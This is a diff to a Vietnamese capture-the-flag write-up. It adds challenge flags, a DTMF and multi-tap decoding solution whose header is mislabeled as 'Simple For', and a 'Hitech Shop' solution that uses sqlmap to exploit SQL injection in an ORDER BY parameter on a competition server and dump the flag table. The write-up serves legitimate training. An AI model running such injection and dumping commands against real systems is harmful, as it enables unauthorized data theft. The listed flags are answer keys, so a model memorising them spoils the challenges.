@@ -4,7 +4,9 @@
  | Title | Category | Points | Flag
  | ------ | ------ | ------ | ------ |
  | [Simple For](#Simple-For) | Misc | 100 | `ASCIS{n3tw0rk_f0r3ns1c_1s_n0t_h4rd}` |
- | [Calculate me](#Calculate-me) | Misc | 100 | `ASCIS{n3tw0rk_f0r3ns1c_1s_n0t_h4rd}` |
+ | [Calculate me](#Calculate-me) | Misc | 100 | `ASCIS{3v3ry0n3_sh0uld_kn0w_pr0gramm1ng}` |
+ | [CALL ME MAYBE](#CALL-ME-MAYBE | Crypto | 100 | `FLAG{SMS AND DMTF}` |
+ | [Hitech Shop](#Hitech-Shop | Web | 100 | `ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY}` |
  
 # Simple For
  
@@ -74,4 +76,83 @@ while True:
     print(data)
 ```
 
+Kết quả ta lấy được cờ.
+
 <img src=files/193213.png>
+
+# Simple For
+
+### Challenge
+
+<img src=files/193838.png>
+
+### Solution
+
+DTMF Code
+
+<img src=files/194556.png>
+
+Phone (SMS)
+
+<img src=files/194643.png>
+
+Cipher.txt > [DTMF Code](https://www.dcode.fr/dtmf-code) > 777767777026630368333 > [Multi-tap Phone (SMS)](https://www.dcode.fr/multitap-abc-cipher) > SMS AND DMTF
+
+# Hitech Shop
+
+### Challenge
+
+<img src=files/195002.png>
+
+### Solution
+
+Fuz thử với dấu `'` ta không thấy display ra lỗi. Vậy guess là web server sử dụng hàm set_error_handler để catch lỗi.
+
+<img src=files/195305.png>
+
+Dùng sqlmap để exploit
+
+```
+# sqlmap -u "http://125.235.240.166:20105/index?order=name" --dbs                  
+...
+available databases [2]:
+[*] information_schema
+[*] vannd
+...
+# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd --tables      
+...
+Database: vannd
+[2 tables]
++----------+
+| flag     |
+| products |
++----------+
+...
+# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd -T flag --dump
+Database: vannd
+Table: flag
+[1 entry]
++---------------------------------------+
+| secret                                |
++---------------------------------------+
+| ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY} |
++---------------------------------------+
+...
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
